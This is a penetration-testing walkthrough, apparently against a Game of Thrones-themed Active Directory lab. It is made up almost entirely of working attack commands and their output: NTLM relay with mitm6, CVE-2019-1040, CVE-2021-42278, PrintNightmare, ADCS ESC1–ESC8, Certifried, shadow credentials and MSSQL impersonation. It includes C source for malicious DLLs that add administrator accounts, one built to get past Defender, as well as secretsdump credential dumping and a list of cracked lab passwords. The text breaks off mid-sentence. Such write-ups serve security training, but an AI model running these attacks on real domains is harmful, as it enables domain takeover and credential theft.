IPv6 is enabled by default in Windows environments, and is preferred over IPv4. When a Windows machine boots, it periodically sends a multicast DHCPv6-request. An attacker in the network may reply to these DHCPv6-requests and imitate an DHCP server. If a client accepts the fake DHCPv6 server, the rogue DHCPv6 provides attacker-controlled DNS server information. If the victim also has automatically discover proxy settings (WPAD) set to active, a request to a Proxy-Auto-Configuration (PAC) file may be sent, using http (http://fakewpad.domain/wpad.dat). A challenge-response can be initiated for this resource to intercept the clients NTLM hash!

To start the rogue DHCPv6 server, the tool mitm6 may be used: 

sudo mitm6 -i eth0 -d essos.local
ntlmrelayx may then be used to start the rogue WPAD server, which expects NTLM hashes for the configuration file of the proxy: 
impacket-ntlmrelayx -6 -wh fakewpad.essos.local -l loot

(1) 
  1. # -6: enables IPv6 relay scenarios
# -wh: WPAD Host name
# -l: Directory to save the harvested loot (NTLM hashes)

Alternatively, these hashes can also be relayed to ldaps, where other options open up such as creating a new computer account (by default, each user is allowed to create 10). The command then looks like this: 

impacket-ntlmrelayx -6 -wh fakewpad.essos.local -t ldaps://10.3.10.12 --add-computer attacker --delegate-access

(1) 
  1. # -t: target the ldaps service for relaying
# --add-computer: adds a new computer account
# --delegate-access: allows the created account to impersonate other users

docs.title: Drop-The-Mic
docs.text:
The Message-Integrity-Code (MIC) is a signature used during NTLM authentication. It is computed based on the secret of the client, so MitM attacks cannot re-compute them. They are used to verify the integrity of NTLM messages, mainly so that they do not get relayed (e.g. from SMB to LDAP). They are optional however, and they can be removed (a flag checks if it is present). CVE-2019-1040 (Drop The Mic) is based on a bug, where the MIC can be removed, even if the flag indicates its presence! This opens up the possibility that SMB communication can be relayed to other services such as LDAP.

Using ntlmrelayx, the SMB authentication can be relayed to LDAPS by adding the additional flag --remove-mic. The following command relays SMB connections to LDAPS (to DC03, MEEREEN), and creates a new computer account on behalf of the victim: 

impacket-ntlmrelayx -t ldaps://10.3.10.12 -smb2support --remove-mic --add-computer attacker-computer --delegate-access

(1) 
  1. # -t: target the ldaps service for relaying
# --add-computer: adds a new computer account
# --delegate-access: allows the created account to impersonate other users

    NOTE: If this does not work, try to use impacket-0.10.0, as it worked reliably there

Now we only need to somehow initiate a SMB connection to our relay server. A tool named coercer tries multiple techniques to try and get a SMB connection to our rogue server. The following command is used for the SRV03 (BRAAVOS), using the account of khal.drogo, as he is an account on essos.local: 

coercer coerce -u khal.drogo -p horse -d essos.local -t braavos.essos.local -l <local_ip>

(1) 
  1. # -u: domain user
# -p: his password
# -d: the domain he is registered in
# -t: the target of coercion
# -l: local ip, where the rogue server sits

The output should tell you something like this: 

[*] Attempting to create computer in: CN=Computers,DC=essos,DC=local
[*] Adding new computer with username: rmmic2$ and password: -{QVP.^}OMY6{ii result: OK
[*] Delegation rights modified succesfully!
[*] rmmic2$ can now impersonate users on BRAAVOS$ via S4U2Proxy

Using this newly created account which can impersonate other users, the Service Ticket of the Administrator can be fetched as follows: 

getST.py -spn host/braavos.essos.local 'ESSOS.LOCAL/rmmic2$:-{QVP.^}OMY6{ii' -dc-ip 10.3.10.12 -impersonate Administrator
This service ticket can then be used to execute commands such as secretsdump: 
export KRB5CCNAME=./Administrator.ccache

impacket-secretsdump -k -no-pass ESSOS.LOCAL/'Administrator'@braavos.essos.local

docs.text:
NORTH/samwell.tarly:Heartsbane # Anonymous SMB enum, Password in tje Desc.
NORTH/arya.stark:Needle # SMB Guest-access, Password in a file
NORTH/brandon.stark:iseedeadpeople # AS-REP Roasting, Hash cracked
ESSOS/missandei:fr3edom # AS-REP Roasting, Hash cracked
NORTH/robb.stark:sexywolfy # LLMNR Attack, Hash cracked
NORTH/hodor:hodor # Password Spray, name=pass
NORTH/rickon.stark:Winter2022 # Password Spray, guessable password
NORTH/jon.snow:iknownothing  # Kerberoasting, Hash cracked
NORTH/jeor.mormont:_L0ngCl@w_ # Cleartext Password in SYSVOL share

#-- New users: --
NORTH/sql_svc:YouWillNotKerboroast1ngMeeeeee # Clear-text password in secrets

docs.title: CVE-2021-42278
docs.text:
This CVE stems from the fact that computer accounts in AD environments typically end with $. If this is missing, Kerberos will still accept the name. These names (Stored in sAMAccountName) may then be renamed to domain controller account names, which allows attackers to impersonate them. Security Principal Names (SPNs) are used by Kerberos to authenticate entities (Example: machinename$@domainname). When renaming a computer account to a domain controller account the SPN will also change. This will fail, as the SPN for the DC already exists. it is possible to clear the servicePrincipalName though.

The vulnerability gets triggered as follows

  1. A user with permissions creates or controls a computer account.
  2. The attacker renames the computer to match a DC name without the trailing $.
  3. After the rename, Kerberos will fail to distinguish between DCNAME and DCNAME$.
  4. Because of this, the DC may resolve the identity falsely during a TGS request.
  5. This confusion can be used to obtain a ST for a privileged account.

As any user in the domain is able to add [10] computers by default, we can check this value (Machine Account Quota: MAQ) beforehand for the user jon.snow: 

nxc ldap winterfell.north.sevenkingdoms.local -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M maq

# output:

MAQ 10.3.10.11 89 WINTERFELL [*] Getting the MachineAccountQuota
MAQ 10.3.10.11 389 WINTERFELL MachineAccountQuota: 10

docs.title: Exploitation
docs.text:
Alongside the usual impacket suite, we need two more python scripts: addspn.py and renameMachine.py (code here)

First off, a computer can be added with the with the addcomputer.py script: 

impacket-addcomputer -computer-name 'samaccountname$' -computer-pass 'ComputerPassword' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/jon.snow:iknownothing'

# output:

[*] Successfully added machine account samaccountname$ with password ComputerPassword.

The existing SPNs of the new computer can be cleared as follows: 

python3 ./addspn.py --clear -t 'samaccountname$' -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' 'winterfell.north.sevenkingdoms.local'

# output:

[+] Bind OK
[+] Found modification target
[+] Printing object before clearing
DN: CN=samaccountname,CN=Computers,DC=north,DC=sevenkingdoms,DC=local - STATUS: Read - READ TIME:
    sAMAccountName: samaccountname$

The controlled computer can then be renamed with renameMachine.py to the name of the Domain Controller (without the trailing $): 

./renameMachine.py -current-name 'samaccountname$' -new-name 'winterfell' -dc-ip 'winterfell.north.sevenkingdoms.local' north.sevenkingdoms.local/jon.snow:iknownothing

# output:

[*] Modifying attribute (sAMAccountName) of object (CN=samaccountname,CN=Computers,DC=north,DC=sevenkingdoms,DC=local): (samaccountname$) -> (winterfell)
[*] New sAMAccountName does not end with '$' (attempting CVE-2021-42278)
[*] Target object modified successfully!

impacket's getTGT tool can then be used to get a TGT for the domain controller machine: 

impacket-getTGT -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell':'ComputerPassword'

# output:

[*] Saving ticket in winterfell.ccache

To avoid naming conflicts, the tool renameMachine.py is used again to rename the controlled computer to its original name: 

./renameMachine.py -current-name 'winterfell' -new-name 'samaccount$' north.sevenkingdoms.local/jon.snow:iknownothing

# output:

[*] Modifying attribute (sAMAccountName) of object (CN=samaccountname,CN=Computers,DC=north,DC=sevenkingdoms,DC=local): (winterfell) -> (samaccount$)
[*] Target object modified successfully!

A Service ticket (ticket for accessing a service) can now be fetched by presenting the gathered TGT (ticket proving that you are that account): 

export KRB5CCNAME=./winterfell.ccache

impacket-getST -self -impersonate 'administrator' -altservice 'CIFS/winterfell.north.sevenkingdoms.local' -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell' -debug

# output:

[*] Requesting S4U2self
[+] Trying to connect to KDC at winterfell.north.sevenkingdoms.local:88
[+] Original sname is not formatted as usual (i.e. CLASS/HOSTNAME), automatically filling the substitution service will fail
[+] Original sname is: winterfell
[+] No service realm in new SPN, using the current one (NORTH.SEVENKINGDOMS.LOCAL)
[*] Changing service from winterfell@NORTH.SEVENKINGDOMS.LOCAL to CIFS/winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL
[*] Saving ticket in administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache

This new ticket can then be used to dump the secrets, as the domain controller account has the needed privileges: 

export KRB5CCNAME=./administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache

impacket-secretsdump -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' @'winterfell.north.sevenkingdoms.local'

NOTE: If this does not work, try to use impacket-0.10.0 (pip3 install impacket==0.10.0), as it worked reliably there

This command then dumps the secrets such as local SAM Hashes, LSA Secrets, ...

docs.title: CVE-2021-1675
docs.text:
... is a vulnerability in Windows Print Spooler Service, also known as PrintNightmare. This CVE allows low privilege users to execute arbitrary code as NT AUTHORITY\SYSTEM. It is possible to trick the system into loading your own DLLs.

To exploit this CVE, the target must have Spooler Services enabled. This can be verified with netexec: 

nxc smb 10.3.10.10-23 -M spooler

# output:

SPOOLER     10.3.10.22   445   CASTELBLACK    Spooler service enabled
SPOOLER     10.3.10.23   445   BRAAVOS        Spooler service enabled
SPOOLER     10.3.10.10   445   KINGSLANDING   Spooler service enabled
SPOOLER     10.3.10.12   445   MEEREEN        Spooler service enabled
SPOOLER     10.3.10.11   445   WINTERFELL     Spooler service enabled

For this exploitation to work, a malicious DLL is required. It will be named nightmare.c. This DLL will try to add a new user and add it to the Administrators group: 

#include <windows.h> 
int RunCMD()
{
    system("net users pnightmare Passw0rd123. /add");
    system("net localgroup administrators pnightmare /add");
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        RunCMD();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

This nightmare.c can be compiled into a nightmare.dll using the following command: 

x86_64-w64-mingw32-gcc -shared -o nightmare.dll nightmare.c
This malicious DLL can then be served on a SMB share so that the victim server can fetch it. smbserver from the impacket suite makes this pretty easy: 
impacket-smbserver -smb2support ATTACKERSHARE .
The nightmare.dll must be in the same directory . as the one where the smbserver was started.

The last step to this exploitation is to execute the CVE-2021-1675 payload found on this github: 

python3 ./CVE-2021-1675.py essos.local/missandei:'fr3edom'@meereen.essos.local '\\<local-IP>\ATTACKERSHARE\nightmare.dll'

# output:

[*] Executing \??\UNC\192.168.56.99\ATTACKERSHARE\nightmare.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0
[*] Stage2: 0
[+] Exploit Completed

To verify if the account was created, a smb connection can be initiated using it: 

nxc smb meereen.essos.local -u pnightmare -p 'Passw0rd123.'

# output:

[+] essos.local\pnightmare:Passw0rd123. (Pwn3d!)

This exploit only works on meereen.essos.local, and on winterfell.essos.local. The problem with winterfell is that it is a newer windows server (2019) than meereen (2016). winterfell's Windows Defender does not allow you to create a admin user.

It is however possible to bypass the restriction above, by using the following nightmare.c instead of the old one. It still creates a new Windows user and promotes him to Administrator, but it uses different APIs: 

/*
 * ADDUSER.C: creating a Windows user programmatically.
 */

#define UNICODE
#define _UNICODE
#include <windows.h>
#include <string.h>
#include <lmaccess.h>
#include <lmerr.h>
#include <tchar.h>

DWORD CreateAdminUserInternal(void)
{
    NET_API_STATUS rc;
    BOOL b;
    DWORD dw;

    USER_INFO_1 ud;
    LOCALGROUP_MEMBERS_INFO_0 gd;
    SID_NAME_USE snu;

    DWORD cbSid = 256;    // 256 bytes should be enough for everybody :)
    BYTE Sid[256];

    DWORD cbDomain = 256 / sizeof(TCHAR);
    TCHAR Domain[256];

    // Create user
    memset(&ud, 0, sizeof(ud));

    ud.usri1_name        = _T("pnightmare2");                // username
    ud.usri1_password    = _T("Test123456789!");             // password
    ud.usri1_priv        = USER_PRIV_USER;                   // cannot set USER_PRIV_ADMIN on creation
    ud.usri1_flags       = UF_SCRIPT | UF_NORMAL_ACCOUNT;    // must be set
    ud.usri1_script_path = NULL;

    rc = NetUserAdd(
        NULL,            // local server
        1,                // information level
        (LPBYTE)&ud,
        NULL            // error value
    );

    if (rc != NERR_Success) {
        _tprintf(_T("NetUserAdd FAIL %d 0x%08x\r\n"), rc, rc);
        return rc;
    }

   _tprintf(_T("NetUserAdd OK\r\n"), rc, rc);

    // Get user SID
    b = LookupAccountName(
        NULL,            // local server
        ud.usri1_name,   // account name
        Sid,             // SID
        &cbSid,          // SID size
        Domain,          // Domain
        &cbDomain,       // Domain size
        &snu             // SID_NAME_USE (enum)
    );

    if (!b) {
        dw = GetLastError();
        _tprintf(_T("LookupAccountName FAIL %d 0x%08x\r\n"), dw, dw);
        return dw;
    }

    // Add user to "Administrators" local group
    memset(&gd, 0, sizeof(gd));

    gd.lgrmi0_sid = (PSID)Sid;

    rc = NetLocalGroupAddMembers(
        NULL,                    // local server
        _T("Administrators"),
        0,                        // information level
        (LPBYTE)&gd,
        1                        // only one entry
    );

    if (rc != NERR_Success) {
        _tprintf(_T("NetLocalGroupAddMembers FAIL %d 0x%08x\r\n"), rc, rc);
        return rc;
    }

    return 0;
}

//
// DLL entry point.
//

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CreateAdminUserInternal();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

// RUNDLL32 entry point
#ifdef __cplusplus
extern "C" {
#endif
__declspec(dllexport) void __stdcall CreateAdminUser(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    CreateAdminUserInternal();
}

#ifdef __cplusplus
}
#endif
// Command-line entry point.
int main()
{
    return CreateAdminUserInternal();
}

It can again be compiled using this command: 

x86_64-w64-mingw32-gcc -shared -o nightmare2.dll nightmare2.c -lnetapi32

By running the exploit again against WINTERFELL, the following smb connection works: 

nxc smb winterfell.north.sevenkingdoms.local -u pnightmare2 -p 'Test123456789!' --ntds

To cleanup the malicious DLLs after exploitation, remove them from C:\Windows\System32\spool\drivers\x64\3!

docs.title: 6   Exploiting ADCS
docs.text:
Active Directory Certificate Services may be configured in a vulnerable way, which allow attackers to do the following things:

  • Steal User Credentials
  • Persist in Machines
  • Escalate Domain Paths
  • Persist in Domains

A great blog post detailing exploitation using ADCs can be found here.

docs.title: ESC08
docs.text:
This attack requires the following prerequisites:

  • ADCS Running with web enrollment enabled
  • A method for coercion
  • A template vulnerable to ESC8

HTTP-based certificate enrollment interfaces are usually vulnerable to NTLM-relay attacks. To check if web enrollment is running, a web-request to the endpoint /certsrv/certfnsh.asp can be made. The target here is BRAAVOS, as it has a IIS Webserver running: 

wget http://10.3.10.23/certsrv/certfnsh.asp

# output:

HTTP request sent, awaiting response... 401 Unauthorized

Username/Password Authentication Failed.
A 401 Unauthorized indicates that it is indeed present.

For the next step, ntlmrelayx is started to relay SMB Authentication to this HTTP-based certificate enrollment interface. The using the template DomainController to exploit it: 

./ntlmrelayx.py -t http://10.3.10.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

(1) 
  1. # --adcs: tells ntlmrelay that the target is ADCS
# --template: Use the certificate template

Now, a coercion method is required to force the DC03 (MEEREEN) to connect to the controlled endpoint. A tool named petitpotam.py found on this github will attempt coerce the DC into connection, without providing valid credentials. This will not work on up-to-date ADs anymore, but authenticated coercion's with tools like coercer should still work. petitpotam.py can be used like this: 

petitpotam.py <local_ip> meereen.essos.local

And the authenticated coercion method can be used like this: 

coercer coerce -u <user> -p <pass> -d <usr_domain> -t meereen.essos.local -l <local_ip>

NOTE: If this does not work, try to use pip3 install pyOpenSSL==24.0.0.

In my case, petitpotam.py did not work, but coercer gave me the following output: 

[*] Base64 certificate of user MEEREEN$:
MIIRbQIBAzCCEScGCSqGSIb3DQEHAaCCERgEghE...
This base64 certificate must be saved in a file. i called mine cert.b64.

Then, the tool gettgtpkinit.py from this github can be used to get the TGT of the DC03: 

python3 ./gettgtpkinit.py -pfx-base64 $(cat cert.b64) 'essos.local'/'meereen$' 'meereen.ccache'

# output:

190 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file

This TGT can then be used to dump secrets using secretsdump (can also be used for anything else): 

export KRB5CCNAME=./meereen.ccache

impacket-secretsdump -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local

certipy-ad is a tool which automates the process above with the relay, and auth options. but it essentially achieves the same goal as the tools above.

docs.title: Certipy Bloodhound Enum
docs.text:
It is possible to enumerate ADCS using bloodhound. certipy-ad offers an ingestor for bloodhound, which specifically searches for vulnerable certificate templates. 

certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 10.3.10.12 -old-bloodhound -vulnerable

NOTE: If this does not work, try to use pip3 install certipy-ad==4.8.0. Also, if you attempt to attach this data to existing bloodhound data, attach it to data collected by sharphound, and not other remote collectors.

After uploading the zip file in bloodhound, all principals with certificate enrollment rights can be queried using this cypher query: 

MATCH p = ()-[:Enroll|AllExtendedRights|GenericAll]->(ct:CertTemplate)  
RETURN p

docs.title: ESC01
docs.text:
This vulnerability can be found using this cypher query in bloodhound: 

MATCH p = ()-[:ADCSESC1]->()  
RETURN p
Alternatively, it can also be seen in the generated TXT or json file of certipy, if it was used like this: 
certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 10.3.10.12 -vulnerable

# output:

[!] Vulnerabilities
ESC1 : Enrollee supplies subject and template allows client authentication.

As the edge in bloodhound implies, this mis-configuration can be exploited using the following steps:

docs.title: Step 1:
docs.text:
Use certipy to request enrollment in the affected template, specifying the target enterprise CA and target principal to impersonate: 

certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local

# output:

[*] Saved certificate and private key to 'administrator.pfx'

docs.title: Step 2:
docs.text:
Request a TGT from the domain, specifying the certificate created in Step 1 and the IP of the DC. 

certipy auth -pfx administrator.pfx -dc-ip 10.3.10.12

docs.title: Step 3:
docs.text:
Using the acquired TGT of the administrator, the typical commands like secretsdump can be executed: 

export KRB5CCNAME=./administrator.ccache

secretsdump.py -k -no-pass -dc-ip 'meereen.essos.local' @'meereen.essos.local'

docs.title: ESC02 / ESC03
docs.text:
This vulnerability can be found using this cypher query in bloodhound: 

MATCH p = ()-[:ADCSESC3]->()  
RETURN p
Alternatively, it can also be seen in the generated TXT or json file of certipy, if it was used like this: 
certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 10.3.10.12 -vulnerable

# output:

[!] Vulnerabilities
ESC2 : Template can be used for any purpose.
ESC3 : Template has Certificate Request Agent EKU set.

Just like with ESC01, it turns out that khal.drogo and missandei are included in the DOMAIN USERS group, which have the ADCSESC3 attribute to ESSOS!

This vulnerability is summarized on the certipy page: 

“ESC2 is when a certificate template can be used for any purpose. Since the certificate can be used for any purpose, it can be used for the same technique as with ESC3 for most certificate templates.”

As the edge in bloodhound implies, this template mis-configuration can be exploited as follows:

docs.title: Step 1:
docs.text:
Use certipy to request an enrollment agent certificate. (allows authorized individuals or services to enroll certificates on behalf of others within a system.) 

certipy req -u khal.drogo@essos.local -p 'horse' -target 10.3.10.23 -template ESC2 -ca ESSOS-CA

(1) 
  1. # Note: -template ESC3 and -template ESC-CRA may also be used!


# output:

[*] Saved certificate and private key to 'khal.drogo.pfx'

docs.title: Step 2:
docs.text:
Use the enrollment agent certificate to issue a certificate request on behalf of another user. That request is made on a certificate template that allows for authentication and permits enrollment via agent enrollment. This means that the same request as before is being made, but on behalf of someone else: 

certipy req -u khal.drogo@essos.local -p 'horse' -target 10.3.10.23 -template User -ca ESSOS-CA -on-behalf-of 'essos\administrator' -pfx khal.drogo.pfx

# output:

[*] Saved certificate and private key to 'administrator.pfx'

docs.title: Step 3:
docs.text:
The steps from ESC01 may now be repeated, as the TGT can now be requested for the impersonated account. With that TGT the secrets can be dumped again for example: 

certipy auth -pfx administrator.pfx -dc-ip 10.3.10.12

export KRB5CCNAME=./administrator.ccache

secretsdump.py -k -no-pass -dc-ip 'meereen.essos.local' @'meereen.essos.local'

docs.title: ESC04
docs.text:
This vulnerability can be found using this cypher query in bloodhound: 

MATCH p = ()-[:ADCSESC4]->()  
RETURN p
Alternatively, it can also be seen in the generated TXT or json file of certipy, if it was used like this: 
certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 10.3.10.12 -vulnerable

# output:

[!] Vulnerabilities
ESC4 : User has dangerous permissions.

Now, khal.drogo has the ADCSESC3 attribute to ESSOS! Upon further investigation, this is due to him having the GenericAll attribute towards the ESC04@ESSOS.LOCAL!

As the edge in bloodhound implies, this is exploitable as follows: 

Step 0.1: Obtain ownership (WriteOwner only)
...
Step 0.2: Obtain GenericAll (WriteOwner, Owns, or WriteDacl only)
...

These steps may be skipped, as the owned user khal.drogo already has the GenericAll attribute towards ESC04.

docs.title: Step 1:
docs.text:
Make certificate template ESC1 abuse-able (via GenericAll). The configuration of the template is changed so that it is vulnerable to ESC1 (explained before). 

certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -save-old

# output:

[*] Saved old configuration for 'ESC4' to 'ESC4.json'
[*] Updating certificate template 'ESC4'
[*] Successfully updated 'ESC4'

Steps 2 and 3 are the same as the steps in ESC01, as ESC01was effectively forced upon this certificate template, which is why they will not be shown here.

NOTE: Before executing commands such as secretsdump, make sure to restore the old configuration of the certificate template as follows: 

certipy template -u khal.drogo@essos.local -p 'horse' -template ESC4 -configuration ESC4.json

# output:

[*] Successfully updated 'ESC4'
IMPORTANT: before we do our usual shenanigans such as dumping secrets with the administrator.ccache, we must restore the old configuration:

docs.title: ESC06
docs.text:
This vulnerability is summarized on the certipy page: 

“ESC6 is when the CA specifies the EDITF_ATTRIBUTESUBJECTALTNAME2 flag. This flag allows the enrollee to specify an arbitrary SAN on all certificates despite a certificate template’s configuration.”
It can also be seen in the generated TXT file of certipy: 
[!] Vulnerabilities
ESC6 : Enrollee can specify SAN.

This basically allows for the exploitation of ESC1, without specifying the ESC1 template. The User template can be used, which by default, domain users can enroll into. The steps are summarized below: 

# step 1
certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template User -ca ESSOS-CA -upn administrator@essos.local
# step 2
certipy auth -pfx administrator.pfx -dc-ip 10.3.10.12
# step 3
export KRB5CCNAME=./administrator.ccache
# --
secretsdump.py -k -no-pass -dc-ip 'meereen.essos.local' @'meereen.essos.local'

docs.title: CVE-2022–26923
docs.text:
As a short summary, this CVE stems from the fact, that the dNSHostName property of a computer must not be unique. This allows any computer to impersonate domain controllers, as confusions might happen similar to the samAccountNameVulnerability. A more detailed explanation can be found here

To exploit this CVE, an account must first be created with a dNSHostName entry, which might get confused for the DC controller: 

certipy account create -u khal.drogo@essos.local -p 'horse' -user 'certifriedpc' -pass 'certifriedpass' -dns 'meereen.essos.local'

# output:

[*] Successfully created account 'certifriedpc$' with password 'certifriedpass'

It is now possible to request a Machine template using the new account, as by default domain computers can enroll in the Machine certificate template: 

certipy req -u 'certifriedpc$'@essos.local -p 'certifriedpass' -target braavos.essos.local -ca ESSOS-CA -template Machine

# output:

[*] Saved certificate and private key to 'meereen.pfx'

Now comes the interesting part. It is possible to authenticate with this certificate as MEEREEN (DC03): 

certipy auth -pfx meereen.pfx -username 'meereen$' -domain essos.local -dc-ip 10.3.10.12

# output:

[*] Saved credential cache to 'meereen.ccache'

The TGT of the domain controller was acquired, but the DC itself does not have the possibility to achieve much. It is possible however, to impersonate the Administrator by abusing the S4U2SELF property, which allows a service to obtain a service ticket, on behalf of a user, to itself: 

export KRB5CCNAME=./meereen.ccache

impacket-getST -self -impersonate 'administrator' -altservice 'CIFS/meereen.essos.local' -k -no-pass -dc-ip 'meereen.essos.local' 'essos.local'/'meereen'

(1) 
  1. # alternatively using `HTTP` instead of `CIFS`


# output:

[*] Saving ticket in administrator@CIFS_meereen.essos.local@ESSOS.LOCAL.ccache

With this TGT of the Administrator, It is possible to execute the usual commands: 

export KRB5CCNAME=./administrator@HTTP_meereen.essos.local@ESSOS.LOCAL.ccache

wmiexec.py -k @meereen.essos.local 

# or

evil-winrm -i meereen.essos.local -r ESSOS.LOCAL 

# or

secretsdump.py -k -no-pass -dc-ip 'meereen.essos.local' @'meereen.essos.local'

docs.title: Shadow Credentials
docs.text:
... attacks stem from the pre-authentication in kerberos being able to be validated symmetrically OR asymmetrically (called PKINIT). AD Users and Computers have a attribute called msDS-KeyCredentialLink which stores raw public keys. When pre-authenticating with PKINIT, the KDC will check if knowledge of the matching private key is there. if so, the user will receive a TGT.

To find out if this attack is possible, the Outbound Object Control's of owned users must be inspected for outgoing attributes such as GenericAll or GenericWrite towards other objects. This allows for the following attacks:

  • Targeted Kerberoast: Add SPN, Kerberoast, remove SPN
  • ForceChangePassword: Change users password using sambas net tool.
  • Shadow Credentials: Create RSA key pair, add new authentication method for a user.

Targeted Kerberoasts rely on weak passwords for cracking, and Changing the Passwords of users is not ideal in real scenarios.

The user khal.drogo has an outbound GenericAll control towards viserys.targaryen, which is abuse-able. Shadow Credential attacks are usually done with pywhisker.py (needs the second tool gettgtpkinit.py to get TGT), but certipy works too, and it gives you the TGT after executing this command: 

certipy shadow auto -u khal.drogo@essos.local -p 'horse' -account 'viserys.targaryen'

viserys.targaryen's outbound object controls show that there is a GenericWrite towards jorah.mormont! This attack may then be repeated: 

certipy shadow auto -u viserys.targaryen@essos.local -hashes 'd96a55df6bef5e0b4d6d956088036097' -account 'jorah.mormont'

docs.title: 7   Exploiting MSSQL
docs.text: Before doing any exploitation of MSSQL, it is smart to first find all users which have SPN's tied to them. Service Principal Names are used in AD-environments to tie user accounts to specific services. For instance, a CRT_SRV account may have an SPN indicating that this is an service account for the certificate services. Also it is important to find out which servers actually provide a MSSQL service, and to what services access is already granted.

docs.title: GetUserSPNs
docs.text:
The tool GetUserSPNs tool from the impacket enumerates these users which have SPNs tied to them: 

impacket-GetUserSPNs north.sevenkingdoms.local/brandon.stark:iseedeadpeople -target-domain north.sevenkingdoms.local

(1) 
  1. # -target-domain: can be used to target other domains!


# output for north.sevenkingdoms.local:

ServicePrincipalName                                 Name
---------------------------------                    -------
CIFS/thewall.north.sevenkingdoms.local               jon.snow
HTTP/thewall.north.sevenkingdoms.local               jon.snow
MSSQLSvc/castelblack.north.sevenkingdoms.local       sql_svc
MSSQLSvc/castelblack.north.sevenkingdoms.local:1433  sql_svc

# output for essos.local:

ServicePrincipalName               Name   
---------------------------------  -------
MSSQLSvc/braavos.essos.local       sql_svc
MSSQLSvc/braavos.essos.local:1433  sql_svc

docs.title: NMAP
docs.text:
nmap can be used to scan a wide range of IP's for the port 1433 as that is the default port for MSSQL servers: 

nmap -p 1433 -sV -sC 10.3.10.0/24
braavos and castelblack seem to offer MSSQL services!

docs.title: NetExec
docs.text:
It can be used similar to nmap to scan a wide range of IP's to find out if they offer MSSQL services. 

nxc mssql 10.3.10.0/24

It is also possible to provide credentials for authenticated enumeration. Using this, netexec also tells you if that account has access to that service: 

nxc mssql 10.3.10.0/24 -u brandon.stark -p iseedeadpeople -d north.sevenkingdoms.local

# output:

MSSQL 10.3.10.22 1433 CASTELBLACK [+] north.sevenkingdoms.local\brandon.stark:iseedeadpeople
MSSQL 10.3.10.23 1433 BRAAVOS [+] north.sevenkingdoms.local\brandon.stark:iseedeadpeople

docs.title: impacket-mssqlclient
docs.text:
The mssqlclient of the impacket suite is a very flexible tool to enumerate and interact with MSSQL services. The connection to a service can be initiated as follows: 

impacket-mssqlclient -windows-auth north.sevenkingdoms.local/brandon.stark:iseedeadpeople@castelblack.north.sevenkingdoms.local

(1) 
  1. # It is possible to use other users from brandon.stark, or other mssql services than the one from castelblack

The mssqlclient interactive session provides a lot of special commands which automatically execute SQL-queries to find interesting information, or to exploit the server.

docs.title: enum_logins
docs.text:
The command enum_logins within the mssqlclient session returns a list of all users in this service, with additional information: 

name                  type_desc       is_disabled   sysadmin ...
-------------------   -------------   -----------   -------- 
sa                    SQL_LOGIN                 0          1 ...
BUILTIN\Users         WINDOWS_GROUP             0          0 ...
NORTH\jon.snow        WINDOWS_LOGIN             0          1 ...
NORTH\brandon.stark   WINDOWS_LOGIN             0          0 ...
Due to the connection using brandon.stark, which is not a MSSQL sysadmin, this list is not complete.

docs.title: enum_impersonate
docs.text:
The command enum_impersonate can be used to see if there were any granted impersonation rights to the current account: 

execute as   database   permission_name   state_desc   grantee
----------   --------   ---------------   ----------   -------------------
b'LOGIN'     b''        IMPERSONATE       GRANT        NORTH\brandon.stark
...
grantor
--------------
NORTH\jon.snow
This output shows that the user NORTH\jon.snow has granted NORTH\brandon.stark the ability to impersonate him.

docs.title: exec_as_login
docs.text:
If impersonation rights are granted to another account, the following command can turn the current session into their session (changing server and database security context): 

exec_as_login NORTH\jon.snow

docs.title: exec_as_user
docs.text: exec_as_user on the other hand, only changes the database security context. The enum_impersonate on a higher privileged account also reveals that arya.stark has been granted impersonation permission on the user dbo on two databases: master and msdb

docs.title: enum_db
docs.text:
This command enumerates all available databases and returns the flag is_trustworthy_on. This flag, if set to 1, indicates that the SQL server allows privileged modules to execute to act outside the database. The output of enum_db shows: 

name     is_trustworthy_on
------   -----------------
master                   0
tempdb                   0
model                    0
msdb                     1

This means that the database msdb can be used to execute privileged actions as dbo (impersonation using arya). 

use msdb
exec_as_user dbo

docs.title: xp_cmdshell
docs.text:
The xp_cmdshell can be used to get code execution on the system. It only works, if the current user counts as a sysadmin. It must be enabled first using the command: 

enable_xp_cmdshell
And then, commands may be executed like this 
xp_cmdshell whoami
With the output being: north\sql_svc

docs.title: coercion
docs.text:
It is also possible to coerce MSSQL servers into authentication, which allows you to get their hashes / relay them to other authentication services! (relaying not set up in lab, but possible) It is also possible to achieve this with very few privileges, for example with hodor:hodor. Therefore, the responder must be set up beforehand: 

